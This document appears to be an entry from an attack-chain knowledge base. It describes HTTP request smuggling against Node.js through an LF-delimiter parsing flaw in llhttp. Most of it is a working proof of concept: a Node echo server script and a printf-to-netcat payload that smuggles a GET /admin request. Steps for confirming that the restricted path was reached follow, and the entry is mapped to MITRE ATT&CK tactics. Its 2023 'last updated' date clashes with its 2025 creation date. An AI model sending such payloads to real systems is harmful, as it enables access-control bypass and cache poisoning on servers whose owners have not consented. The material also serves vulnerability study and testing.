---
tags:
  - http-smuggling
  - node.js
  - web-vulnerability
  - request-parsing
type: attack_chain
tools:
  - '[[tools/Node.js]]'
  - '[[tools/Printf]]'
  - '[[tools/Netcat]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/node-http-server-setup]]'
  - '[[commands/printf-nc-smuggling-payload]]'
platforms:
  - Web
  - Node.js
complexity: medium
procedures:
  - '[[procedures/Setup-Node.js-Test-Server-for-Vulnerability-Testing]]'
  - '[[procedures/Craft-and-Send-HTTP-Request-Smuggling-Payload]]'
  - '[[procedures/Verify-HTTP-Request-Smuggling-Exploitation]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Multi-stage attack chain exploiting HTTP Request Smuggling in Node.js by
  leveraging a delimiter mismatch in the llhttp parser, allowing smuggling of
  requests to access restricted paths.
skill_level: intermediate
impact_level: high
id: 251ffb37-77ac-411e-8e50-7d901595c4df
created_at: '2025-12-13T09:01:17.398Z'
updated_at: '2025-12-13T09:01:17.398Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling in Node.js via LF Delimiter Mismatch

Multi-stage attack chain demonstrating HTTP Request Smuggling in Node.js due to the llhttp parser accepting LF as a delimiter instead of strictly requiring CRLF, violating RFC7230. This allows desynchronization between the Node server and upstream proxies, enabling smuggling of additional requests to access restricted paths like /admin, potentially leading to cache poisoning, security bypass, and credential theft.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Test Server] --> B[Craft and Send Payload]
    B --> C[Verify Smuggling]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node.js]]
- [[tools/Printf]]
- [[tools/Netcat]]

### Target Environment

- Node.js version 17.8.0 or vulnerable equivalent
- HTTP server running on port 80
- Local or network access to the target server

### Initial Access Requirements

- Ability to send HTTP requests to the target server
- No prior credentials needed for demonstration
- Localhost setup for testing

## Detailed Attack Procedures

### Step 1: Setup Test Server
procedure: [[procedures/Setup-Node.js-Test-Server-for-Vulnerability-Testing]]

**Objective**: Create a Node.js HTTP server to observe and test request parsing behavior for vulnerabilities.

**Instructions**: Use [[commands/node-http-server-setup]] to start the server:

```javascript
const http = require('http'); http.createServer((request, response) => { let body = []; request.on('error', (err) => { response.end("error while reading body: " + err) }).on('data', (chunk) => { body.push(chunk); }).on('end', () => { body = Buffer.concat(body).toString(); response.on('error', (err) => { response.end("error while sending response: " + err) }); response.end(JSON.stringify({ "URL": request.url, "Headers": request.headers, "Length": body.length, "Body": body, }) + "\n"); }); }).listen(80);
```

**Expected Output**: Server starts listening on port 80 and is ready to echo back request details.

**Success Indicators**:
- Server runs without errors
- Port 80 is open and accepting connections

### Step 2: Craft and Send Payload
procedure: [[procedures/Craft-and-Send-HTTP-Request-Smuggling-Payload]]

**Objective**: Construct and send a crafted HTTP request exploiting the LF delimiter mismatch to smuggle an additional request.

**Instructions**: Execute [[commands/printf-nc-smuggling-payload]] to send the payload:

```bash
(printf "GET / HTTP/1.1\r\nHost: localhost\r\nDummy: x\nContent-Length: 23\r\n\r\nGET / HTTP/1.1\r\nDummy: GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n\r\n") | nc localhost 80
```

**Expected Output**: The server receives the smuggled request, interpreting it as two separate requests.

**Success Indicators**:
- Payload sent successfully
- No immediate errors in transmission

### Step 3: Verify Smuggling
procedure: [[procedures/Verify-HTTP-Request-Smuggling-Exploitation]]

**Objective**: Observe the server's response to confirm that the smuggled request was processed, indicating successful exploitation.

**Instructions**: Monitor the server's output or response stream. The server should process the initial request to / with a content length of 23, including part of the next request, and then handle a separate request to /admin.

**Expected Output**: Two HTTP responses: one for / with partial body, and one for /admin.

**Success Indicators**:
- Server logs or responds to two distinct requests
- Access to restricted path (/admin) confirmed via smuggled request

## Attack Chain Summary

### Key Achievements

1. Established a test environment to demonstrate the vulnerability
2. Successfully smuggled an HTTP request bypassing standard parsing
3. Confirmed desynchronization leading to potential security bypass

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
